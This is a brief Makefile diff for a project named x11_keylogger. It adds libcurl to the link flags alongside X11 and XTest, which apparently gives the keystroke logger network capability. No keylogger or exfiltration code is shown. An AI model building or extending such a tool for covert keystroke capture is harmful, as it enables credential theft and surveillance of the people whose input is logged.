@@ -2,7 +2,7 @@
 
 CC = gcc
 CFLAGS = -Wall -Wextra -O2
-LDFLAGS = -lX11 -lXtst -lpthread
+LDFLAGS = -lX11 -lXtst -lpthread -lcurl
 TARGET = x11_keylogger
 SOURCE = src/x11_keylogger.c
 
